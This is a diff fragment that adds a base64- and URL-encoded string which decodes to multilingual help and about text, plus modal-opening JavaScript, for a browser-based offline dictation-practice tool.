+    +"ODglRTUlOUIlQTAlRTYlQjUlOEYlRTglQTclODglRTUlOTklQTglRTglODAlOEMlRTUlQkMlODIlRUYl"
+    +"QkMlODklRTMlODAlODIlM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUzQyUyRnVsJTNFJTBBJTIwJTIw"
+    +"JTIwJTIwJTNDaDMlM0UlRTYlOTIlQUQlRTYlOTQlQkUlRTYlOEUlQTclRTUlODglQjYlM0MlMkZoMyUz"
+    +"RSUwQSUyMCUyMCUyMCUyMCUzQ3VsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJv"
+    +"bmclM0UlRTIlOEYlQUUlMjAlMkYlMjAlRTIlOEYlQUQlM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQl"
+    +"MjAlRTQlQjglOEElRTQlQjglODAlRTQlQjglQUElMjAlMkYlMjAlRTQlQjglOEIlRTQlQjglODAlRTQl"
+    +"QjglQUElRUYlQkMlOEMlRTQlQkYlOUQlRTYlOEMlODElRTUlQkQlOTMlRTUlODklOEQlRTYlOTIlQUQl"
+    +"RTYlOTQlQkUlRTYlODglOTYlRTYlOUElODIlRTUlODElOUMlRTclOEElQjYlRTYlODAlODElRTMlODAl"
+    +"ODIlM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFJUUyJThG"
+    +"JUI4JTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwJUU2JTlBJTgyJUU1JTgxJTlDJUU0JUI4JThF"
+    +"JUU3JUJCJUE3JUU3JUJCJUFEJUUzJTgwJTgyJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAl"
+    +"M0NsaSUzRSUzQ3N0cm9uZyUzRSVGMCU5RiU5NCU4MSUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUy"
+    +"MCVFNSU4OCU4NyVFNiU4RCVBMiVFNSVCRCU5MyVFNSU4OSU4RCVFOSVBMSVCOSVFNyU5QSU4NCVFNSVC"
+    +"RSVBQSVFNyU4RSVBRiVFNiU5MiVBRCVFNiU5NCVCRSVFMyU4MCU4MiVFNiVCRiU4MCVFNiVCNCVCQiVF"
+    +"NSU5MCU4RSVFRiVCQyU4QyVFNSVCRCU5MyVFNSU4OSU4RCVFOSVBMSVCOSVFNSVCMCU4NiVFNCVCQiVB"
+    +"NSVFNSVCRCU5MyVFNSU4OSU4RCVFOSU4MCU5RiVFNSVCQSVBNiVFNSU5MiU4QyVFOSU5NyVCNCVFOSU5"
+    +"QSU5NCVFNiU5NyVBMCVFOSU5OSU5MCVFOSU4NyU4RCVFNSVBNCU4RCVFMyU4MCU4MiVFNSU4NiU4RCVF"
+    +"NiVBQyVBMSVFNyU4MiVCOSVFNSU4NyVCQiUyMCUzQ3N0cm9uZyUzRSVGMCU5RiU5NCU4MSUzQyUyRnN0"
+    +"cm9uZyUzRSUyMCVFNSU4RiVBRiVFNSU4MSU5QyVFNiVBRCVBMiVFNSVCRSVBQSVFNyU4RSVBRiVFNSVC"
+    +"OSVCNiVFNiU4MSVBMiVFNSVBNCU4RCVFNiVBRCVBMyVFNSVCOCVCOCVFNiU5MiVBRCVFNiU5NCVCRSVF"
+    +"MyU4MCU4MiUzQyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0Ul"
+    +"RTIlOEYlQjklM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjAlRTUlODElOUMlRTYlQUQlQTIlRTUl"
+    +"QjklQjYlRTklODclOEQlRTclQkQlQUUlRTMlODAlODIlM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUz"
+    +"QyUyRnVsJTNFJTYwJTJDJTBBJTIwJTIwZXMlM0ElMjAlNjAlMEElMjAlMjAlMjAlMjAlM0NoMyUzRSVD"
+    +"MiVCRlBhcmElMjBxdSVDMyVBOSUyMHNpcnZlJTNGJTNDJTJGaDMlM0UlMEElMjAlMjAlMjAlMjAlM0Nw"
+    +"JTNFRGljdGFkbyUyMGVzJTIwdW5hJTIwaGVycmFtaWVudGElMjBkZSUyMHByJUMzJUExY3RpY2ElMjBx"
+    +"dWUlMjBsZWUlMjB0dSUyMHRleHRvJTIwZW4lMjB2b3olMjBhbHRhJTIwcGFsYWJyYSUyMHBvciUyMHBh"
+    +"bGFicmElMjBvJTIwZnJhc2UlMjBwb3IlMjBmcmFzZSUyQyUyMHBhcmElMjBxdWUlMjBwdWVkYXMlMjBl"
+    +"c2NyaWJpciUyMGxvJTIwcXVlJTIwZXNjdWNoYXMuJTNDJTJGcCUzRSUwQSUyMCUyMCUyMCUyMCUzQ2gz"
+    +"JTNFUHJpbWVyb3MlMjBwYXNvcyUzQyUyRmgzJTNFJTBBJTIwJTIwJTIwJTIwJTNDdWwlM0UlMEElMjAl"
+    +"MjAlMjAlMjAlMjAlMjAlM0NsaSUzRVBlZ2ElMjBvJTIwZXNjcmliZSUyMHRleHRvJTIwZW4lMjBlbCUy"
+    +"MGN1YWRybyUyMCUzQ3N0cm9uZyUzRUNvbnRlbmlkbyUzQyUyRnN0cm9uZyUzRSUyQyUyMG8lMjBzdWJl"
+    +"JTIwdW4lMjAlM0NzdHJvbmclM0VhcmNoaXZvJTIwLnR4dCUzQyUyRnN0cm9uZyUzRS4lM0MlMkZsaSUz"
+    +"RSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFUHVsc2ElMjAlM0NzdHJvbmclM0UlRTIlOTYlQjYl"
+    +"MjBSZXByb2R1Y2lyJTNDJTJGc3Ryb25nJTNFJTIwcGFyYSUyMGVtcGV6YXIuJTNDJTJGbGklM0UlMEEl"
+    +"MjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRVVzYSUyMCUzQ3N0cm9uZyUzRU1vc3RyYXIlMjAlMkYlMjBP"
+    +"Y3VsdGFyJTNDJTJGc3Ryb25nJTNFJTIwcGFyYSUyMHZlciUyMG8lMjBlc2NvbmRlciUyMGxhJTIwcGFs"
+    +"YWJyYSUyMG8lMjBmcmFzZSUyMGFjdHVhbC4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUzQyUyRnVs"
+    +"JTNFJTBBJTIwJTIwJTIwJTIwJTNDaDMlM0VBanVzdGVzJTNDJTJGaDMlM0UlMEElMjAlMjAlMjAlMjAl"
+    +"M0N1bCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFTW9kbyUzQyUyRnN0"
+    +"cm9uZyUzRSUyMCVFMiU4MCU5NCUyMFBhbGFicmElMjBwb3IlMjBwYWxhYnJhJTIwbyUyMEZyYXNlJTIw"
+    +"cG9yJTIwZnJhc2UuJTIwRW4lMjBtb2RvJTIwZnJhc2UlMkMlMjB0YW1iaSVDMyVBOW4lMjBzZSUyMHBh"
+    +"dXNhJTIwZW4lMjBsYXMlMjBjb21hcy4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xp"
+    +"JTNFJTNDc3Ryb25nJTNFUGF1c2ElM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjB0aWVtcG8lMjBl"
+    +"bnRyZSUyMGVsZW1lbnRvcy4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTND"
+    +"c3Ryb25nJTNFUmVwZXRpciUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMHZlY2VzJTIwcXVlJTIw"
+    +"c2UlMjByZXBpdGUlMjBjYWRhJTIwZWxlbWVudG8uJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAl"
+    +"MjAlM0NsaSUzRSUzQ3N0cm9uZyUzRVZveiUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMGVsaWdl"
+    +"JTIwdW5hJTIwdm96JTIwaW5zdGFsYWRhJTIwZW4lMjB0dSUyMGRpc3Bvc2l0aXZvLiUzQyUyRmxpJTNF"
+    +"JTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0VWZWxvY2lkYWQlM0MlMkZzdHJv"
+    +"bmclM0UlMjAlRTIlODAlOTQlMjByYWxlbnRpemElMjBvJTIwYWNlbGVyYSUyMGxhJTIwdm96LiUzQyUy"
+    +"RmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0VSZXRhcmRvJTIwZGUl"
+    +"MjBpbmljaW8lMjBUVFMlM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjBhdW0lQzMlQTludGFsbyUy"
+    +"MHNpJTIwc2UlMjBjb3J0YSUyMGxhJTIwcHJpbWVyYSUyMHBhbGFicmElMjAlMjhkZXBlbmRlJTIwZGVs"
+    +"JTIwbmF2ZWdhZG9yJTI5LiUzQyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEElMjAl"
+    +"MjAlMjAlMjAlM0NoMyUzRUNvbnRyb2xlcyUyMGRlJTIwcmVwcm9kdWNjaSVDMyVCM24lM0MlMkZoMyUz"
+    +"RSUwQSUyMCUyMCUyMCUyMCUzQ3VsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJv"
+    +"bmclM0UlRTIlOEYlQUUlMjAlMkYlMjAlRTIlOEYlQUQlM0MlMkZzdHJvbmclM0UlMjAlRTIlODAlOTQl"
+    +"MjBlbGVtZW50byUyMGFudGVyaW9yJTIwJTJGJTIwc2lndWllbnRlJTJDJTIwY29uc2VydmFuZG8lMjBl"
+    +"bCUyMGVzdGFkbyUyMGRlJTIwcmVwcm9kdWNjaSVDMyVCM24uJTNDJTJGbGklM0UlMEElMjAlMjAlMjAl"
+    +"MjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRSVFMiU4RiVCOCUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4"
+    +"MCU5NCUyMHBhdXNhJTIweSUyMHJlYW51ZGEuJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAl"
+    +"M0NsaSUzRSUzQ3N0cm9uZyUzRSVGMCU5RiU5NCU4MSUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUy"
+    +"MGFjdGl2YSUyMG8lMjBkZXNhY3RpdmElMjBsYSUyMHJlcGV0aWNpJUMzJUIzbiUyMGVuJTIwYnVjbGUl"
+    +"MjBkZWwlMjBlbGVtZW50byUyMGFjdHVhbC4lMjBNaWVudHJhcyUyMGVzdCVDMyVBMSUyMGFjdGl2byUy"
+    +"QyUyMGVsJTIwZWxlbWVudG8lMjBzZSUyMHJlcGl0ZSUyMGluZGVmaW5pZGFtZW50ZS4lMjBIYXolMjBj"
+    +"bGljJTIwZW4lMjAlM0NzdHJvbmclM0UlRjAlOUYlOTQlODElM0MlMkZzdHJvbmclM0UlMjBkZSUyMG51"
+    +"ZXZvJTIwcGFyYSUyMHJlYW51ZGFyJTIwbGElMjBwcm9ncmVzaSVDMyVCM24lMjBub3JtYWwuJTNDJTJG"
+    +"bGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRSVFMiU4RiVCOSUzQyUy"
+    +"RnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMGRldGllbmUlMjB5JTIwcmVpbmljaWEuJTNDJTJGbGklM0Ul"
+    +"MEElMjAlMjAlMjAlMjAlM0MlMkZ1bCUzRSU2MCUyQyUwQSUyMCUyMGRlJTNBJTIwJTYwJTBBJTIwJTIw"
+    +"JTIwJTIwJTNDaDMlM0VXb2YlQzMlQkNyJTIwaXN0JTIwZGFzJTNGJTNDJTJGaDMlM0UlMEElMjAlMjAl"
+    +"MjAlMjAlM0NwJTNFRGlrdGF0JTIwaXN0JTIwZWluJTIwJUMzJTlDYnVuZ3N3ZXJremV1ZyUyQyUyMGRh"
+    +"cyUyMElocmVuJTIwVGV4dCUyMFdvcnQlMjBmJUMzJUJDciUyMFdvcnQlMjBvZGVyJTIwU2F0eiUyMGYl"
+    +"QzMlQkNyJTIwU2F0eiUyMHZvcmxpZXN0JTJDJTIwZGFtaXQlMjBTaWUlMjBzY2hyZWliZW4lMjBrJUMz"
+    +"JUI2bm5lbiUyQyUyMHdhcyUyMFNpZSUyMGglQzMlQjZyZW4uJTNDJTJGcCUzRSUwQSUyMCUyMCUyMCUy"
+    +"MCUzQ2gzJTNFRXJzdGUlMjBTY2hyaXR0ZSUzQyUyRmgzJTNFJTBBJTIwJTIwJTIwJTIwJTNDdWwlM0Ul"
+    +"MEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRVRleHQlMjBpbiUyMGRhcyUyMEZlbGQlMjAlM0NzdHJv"
+    +"bmclM0VJbmhhbHQlM0MlMkZzdHJvbmclM0UlMjBlaW5mJUMzJUJDZ2VuJTIwb2RlciUyMGVpbmUlMjAl"
+    +"M0NzdHJvbmclM0UudHh0LURhdGVpJTNDJTJGc3Ryb25nJTNFJTIwaG9jaGxhZGVuLiUzQyUyRmxpJTNF"
+    +"JTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0UlRTIlOTYlQjYlMjBXaWVkZXJn"
+    +"YWJlJTNDJTJGc3Ryb25nJTNFJTIwZHIlQzMlQkNja2VuJTJDJTIwdW0lMjB6dSUyMGJlZ2lubmVuLiUz"
+    +"QyUyRmxpJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0VBbnplaWdlbiUy"
+    +"MCUyRiUyMEF1c2JsZW5kZW4lM0MlMkZzdHJvbmclM0UlMjBudXR6ZW4lMkMlMjB1bSUyMGRhcyUyMGFr"
+    +"dHVlbGxlJTIwV29ydCUyMG9kZXIlMjBkZW4lMjBTYXR6JTIwZWluLSUyMG9kZXIlMjBhdXN6dWJsZW5k"
+    +"ZW4uJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlM0MlMkZ1bCUzRSUwQSUyMCUyMCUyMCUyMCUzQ2gz"
+    +"JTNFRWluc3RlbGx1bmdlbiUzQyUyRmgzJTNFJTBBJTIwJTIwJTIwJTIwJTNDdWwlM0UlMEElMjAlMjAl"
+    +"MjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRU1vZHVzJTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgw"
+    +"JTk0JTIwV29ydCUyMGYlQzMlQkNyJTIwV29ydCUyMG9kZXIlMjBTYXR6JTIwZiVDMyVCQ3IlMjBTYXR6"
+    +"LiUyMEltJTIwU2F0em1vZHVzJTIwd2lyZCUyMGF1Y2glMjBiZWklMjBLb21tYXMlMjBwYXVzaWVydC4l"
+    +"M0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFUGF1c2UlM0Ml"
+    +"MkZzdHJvbmclM0UlMjAlRTIlODAlOTQlMjBBYnN0YW5kJTIwendpc2NoZW4lMjBkZW4lMjBFbGVtZW50"
+    +"ZW4uJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRVdpZWRl"
+    +"cmhvbGVuJTNDJTJGc3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwd2llJTIwb2Z0JTIwamVkZXMlMjBFbGVt"
+    +"ZW50JTIwZ2VzcHJvY2hlbiUyMHdpcmQuJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0Ns"
+    +"aSUzRSUzQ3N0cm9uZyUzRVN0aW1tZSUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMGVpbmUlMjBh"
+    +"dWYlMjBkZW0lMjBHZXIlQzMlQTR0JTIwaW5zdGFsbGllcnRlJTIwU3RpbW1lJTIwdyVDMyVBNGhsZW4u"
+    +"JTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ3N0cm9uZyUzRUdlc2Nod2lu"
+    +"ZGlna2VpdCUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMFNwcmFjaGUlMjB2ZXJsYW5nc2FtZW4l"
+    +"MjBvZGVyJTIwYmVzY2hsZXVuaWdlbi4lM0MlMkZsaSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xp"
+    +"JTNFJTNDc3Ryb25nJTNFVFRTLVN0YXJ0dmVyeiVDMyVCNmdlcnVuZyUzQyUyRnN0cm9uZyUzRSUyMCVF"
+    +"MiU4MCU5NCUyMGVyaCVDMyVCNmhlbiUyQyUyMHdlbm4lMjBkYXMlMjBlcnN0ZSUyMFdvcnQlMjBhYmdl"
+    +"c2Nobml0dGVuJTIwd2lyZCUyMCUyOGJyb3dzZXJhYmglQzMlQTRuZ2lnJTI5LiUzQyUyRmxpJTNFJTBB"
+    +"JTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEElMjAlMjAlMjAlMjAlM0NoMyUzRVdpZWRlcmdhYmUtU3Rl"
+    +"dWVydW5nJTNDJTJGaDMlM0UlMEElMjAlMjAlMjAlMjAlM0N1bCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUy"
+    +"MCUzQ2xpJTNFJTNDc3Ryb25nJTNFJUUyJThGJUFFJTIwJTJGJTIwJUUyJThGJUFEJTNDJTJGc3Ryb25n"
+    +"JTNFJTIwJUUyJTgwJTk0JTIwdm9yaGVyaWdlcyUyMCUyRiUyMG4lQzMlQTRjaHN0ZXMlMjBFbGVtZW50"
+    +"JTJDJTIwV2llZGVyZ2FiZS0lMkZQYXVzZXp1c3RhbmQlMjBibGVpYnQlMjBlcmhhbHRlbi4lM0MlMkZs"
+    +"aSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDc3Ryb25nJTNFJUUyJThGJUI4JTNDJTJG"
+    +"c3Ryb25nJTNFJTIwJUUyJTgwJTk0JTIwUGF1c2UlMjB1bmQlMjBGb3J0c2V0emVuLiUzQyUyRmxpJTNF"
+    +"JTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NzdHJvbmclM0UlRjAlOUYlOTQlODElM0MlMkZz"
+    +"dHJvbmclM0UlMjAlRTIlODAlOTQlMjBzY2hhbHRldCUyMGRpZSUyMEVuZGxvc3dpZWRlcmhvbHVuZyUy"
+    +"MGRlcyUyMGFrdHVlbGxlbiUyMEVsZW1lbnRzJTIwZWluJTIwb2RlciUyMGF1cy4lMjBXJUMzJUE0aHJl"
+    +"bmQlMjBha3RpdiUyQyUyMHdpcmQlMjBkYXMlMjBFbGVtZW50JTIwdW5iZWdyZW56dCUyMHdpZWRlcmhv"
+    +"bHQuJTIwRXJuZXV0JTIwYXVmJTIwJTNDc3Ryb25nJTNFJUYwJTlGJTk0JTgxJTNDJTJGc3Ryb25nJTNF"
+    +"JTIwa2xpY2tlbiUyQyUyMHVtJTIwZGllJTIwU2NobGVpZmUlMjB6dSUyMGJlZW5kZW4lMjB1bmQlMjBu"
+    +"b3JtYWwlMjBmb3J0enVmYWhyZW4uJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUz"
+    +"RSUzQ3N0cm9uZyUzRSVFMiU4RiVCOSUzQyUyRnN0cm9uZyUzRSUyMCVFMiU4MCU5NCUyMFN0b3BwJTIw"
+    +"dW5kJTIwWnVyJUMzJUJDY2tzZXR6ZW4uJTNDJTJGbGklM0UlMEElMjAlMjAlMjAlMjAlM0MlMkZ1bCUz"
+    +"RSU2MCUyQyUwQSU3RCUzQiUwQSUwQWNvbnN0JTIwQUJPVVRfQ09OVEVOVCUyMCUzRCUyMCU3QiUwQSUy"
+    +"MCUyMGVuJTNBJTIwJTYwJTNDZGl2JTIwY2xhc3MlM0QlMjJhYm91dC1jZW50ZXIlMjIlM0UlMEElMjAl"
+    +"MjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmFib3V0LWFwcC1uYW1lJTIyJTNFRGljdGF0aW9uJTND"
+    +"JTJGZGl2JTNFJTBBJTIwJTIwJTIwJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJhYm91dC1jb3B5JTIyJTNF"
+    +"JTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDcCUzRUElMjBmcmVlJTJDJTIwb2ZmbGluZSUyMGRpY3RhdGlv"
+    +"biUyMHByYWN0aWNlJTIwdG9vbC4lM0NiciUzRVJ1bnMlMjBlbnRpcmVseSUyMGluJTIweW91ciUyMGJy"
+    +"b3dzZXIlMjAlRTIlODAlOTQlMjBubyUyMGRhdGElMjBpcyUyMHNlbnQlMjBhbnl3aGVyZS4lM0MlMkZw"
+    +"JTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTNDcCUyMHN0eWxlJTNEJTIybWFyZ2luLXRvcCUzQTE2cHgl"
+    +"M0IlMjIlM0VDb3B5cmlnaHQlMjAlMjZjb3B5JTNCJTIwMjAyNiUyMCUzQ3N0cm9uZyUzRUNIRU4lMjBY"
+    +"SSUzQyUyRnN0cm9uZyUzRSUzQ2JyJTNFQWxsJTIwcmlnaHRzJTIwcmVzZXJ2ZWQuJTNDJTJGcCUzRSUw"
+    +"QSUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwQSUyMCUyMCUzQyUyRmRpdiUzRSU2MCUyQyUwQSUyMCUy"
+    +"MGZyJTNBJTIwJTYwJTNDZGl2JTIwY2xhc3MlM0QlMjJhYm91dC1jZW50ZXIlMjIlM0UlMEElMjAlMjAl"
+    +"MjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmFib3V0LWFwcC1uYW1lJTIyJTNFRGljdCVDMyVBOWUlM0Ml"
+    +"MkZkaXYlM0UlMEElMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmFib3V0LWNvcHklMjIlM0Ul"
+    +"MEElMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFVW4lMjBvdXRpbCUyMGRlJTIwZGljdCVDMyVBOWUlMjBn"
+    +"cmF0dWl0JTIwZXQlMjBob3JzJTIwbGlnbmUuJTNDYnIlM0VGb25jdGlvbm5lJTIwZW50aSVDMyVBOHJl"
+    +"bWVudCUyMGRhbnMlMjB2b3RyZSUyMG5hdmlnYXRldXIuJTNDJTJGcCUzRSUwQSUyMCUyMCUyMCUyMCUy"
+    +"MCUyMCUzQ3AlMjBzdHlsZSUzRCUyMm1hcmdpbi10b3AlM0ExNnB4JTNCJTIyJTNFQ29weXJpZ2h0JTIw"
+    +"JTI2Y29weSUzQiUyMDIwMjYlMjAlM0NzdHJvbmclM0VDSEVOJTIwWEklM0MlMkZzdHJvbmclM0UlM0Ni"
+    +"ciUzRVRvdXMlMjBkcm9pdHMlMjByJUMzJUE5c2VydiVDMyVBOXMuJTNDJTJGcCUzRSUwQSUyMCUyMCUy"
+    +"MCUyMCUzQyUyRmRpdiUzRSUwQSUyMCUyMCUzQyUyRmRpdiUzRSU2MCUyQyUwQSUyMCUyMHpoJTNBJTIw"
+    +"JTYwJTNDZGl2JTIwY2xhc3MlM0QlMjJhYm91dC1jZW50ZXIlMjIlM0UlMEElMjAlMjAlMjAlMjAlM0Nk"
+    +"aXYlMjBjbGFzcyUzRCUyMmFib3V0LWFwcC1uYW1lJTIyJTNFJUU1JTkwJUFDJUU1JTg2JTk5JTNDJTJG"
+    +"ZGl2JTNFJTBBJTIwJTIwJTIwJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJhYm91dC1jb3B5JTIyJTNFJTBB"
+    +"JTIwJTIwJTIwJTIwJTIwJTIwJTNDcCUzRSVFNSU4NSU4RCVFOCVCNCVCOSVFNyVBNiVCQiVFNyVCQSVC"
+    +"RiVFNSU5MCVBQyVFNSU4NiU5OSVFNyVCQiU4MyVFNCVCOSVBMCVFNSVCNyVBNSVFNSU4NSVCNyVFMyU4"
+    +"MCU4MiUzQ2JyJTNFJUU1JUFFJThDJUU1JTg1JUE4JUU1JTlDJUE4JUU2JUI1JThGJUU4JUE3JTg4JUU1"
+    +"JTk5JUE4JUU0JUI4JUFEJUU4JUJGJTkwJUU4JUExJThDJUVGJUJDJThDJUU0JUI4JThEJUU1JThGJTkx"
+    +"JUU5JTgwJTgxJUU0JUJCJUJCJUU0JUJEJTk1JUU2JTk1JUIwJUU2JThEJUFFJUUzJTgwJTgyJTNDJTJG"
+    +"cCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ3AlMjBzdHlsZSUzRCUyMm1hcmdpbi10b3AlM0ExNnB4"
+    +"JTNCJTIyJTNFJUU3JTg5JTg4JUU2JTlEJTgzJUU2JTg5JTgwJUU2JTlDJTg5JTIwJTI2Y29weSUzQiUy"
+    +"MDIwMjYlMjAlM0NzdHJvbmclM0UlRTklOTklODglRTUlQjglOEMlM0MlMkZzdHJvbmclM0UlM0NiciUz"
+    +"RSVFNCVCRiU5RCVFNyU5NSU5OSVFNiU4OSU4MCVFNiU5QyU4OSVFNiU5RCU4MyVFNSU4OCVBOSVFMyU4"
+    +"MCU4MiUzQyUyRnAlM0UlMEElMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEElMjAlMjAlM0MlMkZkaXYl"
+    +"M0UlNjAlMkMlMEElMjAlMjBlcyUzQSUyMCU2MCUzQ2RpdiUyMGNsYXNzJTNEJTIyYWJvdXQtY2VudGVy"
+    +"JTIyJTNFJTBBJTIwJTIwJTIwJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJhYm91dC1hcHAtbmFtZSUyMiUz"
+    +"RURpY3RhZG8lM0MlMkZkaXYlM0UlMEElMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmFib3V0"
+    +"LWNvcHklMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFVW5hJTIwaGVycmFtaWVudGElMjBk"
+    +"ZSUyMGRpY3RhZG8lMjBncmF0dWl0YSUyMHklMjBzaW4lMjBjb25leGklQzMlQjNuLiUzQ2JyJTNFRnVu"
+    +"Y2lvbmElMjBjb21wbGV0YW1lbnRlJTIwZW4lMjB0dSUyMG5hdmVnYWRvci4lM0MlMkZwJTNFJTBBJTIw"
+    +"JTIwJTIwJTIwJTIwJTIwJTNDcCUyMHN0eWxlJTNEJTIybWFyZ2luLXRvcCUzQTE2cHglM0IlMjIlM0VD"
+    +"b3B5cmlnaHQlMjAlMjZjb3B5JTNCJTIwMjAyNiUyMCUzQ3N0cm9uZyUzRUNIRU4lMjBYSSUzQyUyRnN0"
+    +"cm9uZyUzRSUzQ2JyJTNFVG9kb3MlMjBsb3MlMjBkZXJlY2hvcyUyMHJlc2VydmFkb3MuJTNDJTJGcCUz"
+    +"RSUwQSUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwQSUyMCUyMCUzQyUyRmRpdiUzRSU2MCUyQyUwQSUy"
+    +"MCUyMGRlJTNBJTIwJTYwJTNDZGl2JTIwY2xhc3MlM0QlMjJhYm91dC1jZW50ZXIlMjIlM0UlMEElMjAl"
+    +"MjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmFib3V0LWFwcC1uYW1lJTIyJTNFRGlrdGF0JTNDJTJG"
+    +"ZGl2JTNFJTBBJTIwJTIwJTIwJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJhYm91dC1jb3B5JTIyJTNFJTBB"
+    +"JTIwJTIwJTIwJTIwJTIwJTIwJTNDcCUzRUVpbiUyMGtvc3Rlbmxvc2VzJTJDJTIwb2ZmbGluZSUyMERp"
+    +"a3RhdC0lQzMlOUNidW5nc3dlcmt6ZXVnLiUzQ2JyJTNFTCVDMyVBNHVmdCUyMHZvbGxzdCVDMyVBNG5k"
+    +"aWclMjBpbSUyMEJyb3dzZXIuJTNDJTJGcCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUzQ3AlMjBzdHls"
+    +"ZSUzRCUyMm1hcmdpbi10b3AlM0ExNnB4JTNCJTIyJTNFQ29weXJpZ2h0JTIwJTI2Y29weSUzQiUyMDIw"
+    +"MjYlMjAlM0NzdHJvbmclM0VDSEVOJTIwWEklM0MlMkZzdHJvbmclM0UlM0NiciUzRUFsbGUlMjBSZWNo"
+    +"dGUlMjB2b3JiZWhhbHRlbi4lM0MlMkZwJTNFJTBBJTIwJTIwJTIwJTIwJTNDJTJGZGl2JTNFJTBBJTIw"
+    +"JTIwJTNDJTJGZGl2JTNFJTYwJTJDJTBBJTdEJTNCJTBBJTBBZnVuY3Rpb24lMjBvcGVuTW9kYWwlMjhp"
+    +"ZCUyOSUyMCU3QiUwQSUyMCUyMCUyNCUyOCUyN2hlbHAtbWVudS1kcm9wZG93biUyNyUyOS5jbGFzc0xp"
+    +"c3QucmVtb3ZlJTI4JTI3b3BlbiUyNyUyOSUzQiUwQSUyMCUyMGlmJTIwJTI4aWQlMjAlM0QlM0QlM0Ql"
+    +"MjAlMjdoZWxwLW1vZGFsJTI3JTI5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTI0JTI4JTI3aGVscC1tb2Rh"
+    +"bC1ib2R5JTI3JTI5LmlubmVySFRNTCUyMCUzRCUyMEhFTFBfQ09OVEVOVCU1QmN1cnJlbnRMYW5nJTVE"
